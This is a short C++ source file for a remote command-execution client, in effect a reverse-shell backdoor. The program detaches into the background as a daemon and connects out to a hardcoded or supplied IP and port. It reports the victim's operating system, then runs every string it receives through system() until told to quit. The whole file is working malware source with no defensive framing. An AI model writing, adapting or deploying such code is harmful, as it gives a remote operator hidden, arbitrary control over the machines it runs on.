#include "net_platform.h"
#include <cstring>
#include <netinet/in.h>
#include <string>
#include <sys/socket.h>

int main(int argc ,char *argv[]) {
    #ifdef _WIN32

    #else
        daemon(0, 0);
    #endif

    net_init();

    socket_t sockfd = ::socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (socket_create_falied(sockfd)) {
        net_cleanup();
        return 1;
    }

    std::string ip = "10.52.14.210";
    int port = 8888;

    if (argc > 2) {
        ip = argv[1];
        port = atoi(argv[2]);
    }

    struct sockaddr_in sockaddr;
    std::memset(&sockaddr, 0, sizeof(sockaddr));
    sockaddr.sin_family = AF_INET;
    sockaddr.sin_addr.s_addr = inet_addr(ip.c_str());
    sockaddr.sin_port = htons(port);

    if (::connect(sockfd, (struct sockaddr*)&sockaddr, sizeof(sockaddr)) < 0) {
        close_socket(sockfd);
        net_cleanup();
        return 1;
    }

    std::string connect_msg;
    #ifdef _WIN32
        connect_msg = "A windows device has connected!";
    #else
        connect_msg = "A linux device has connected!";
    #endif

    ::send(sockfd, connect_msg.c_str(), connect_msg.size(), 0);

    while (true) {
        char buf[1024] = {0};
        ::recv(sockfd, buf, sizeof(buf), 0);
        if(!strcmp(buf, "q") || !strcmp(buf, "quit") || !strcmp(buf, "exit")) {
            break;
        }

        system(buf);
        std::string reply = "cmd made!";
        ::send(sockfd, reply.c_str(), reply.size(), 0);
    }

    net_cleanup();
    return 0;
}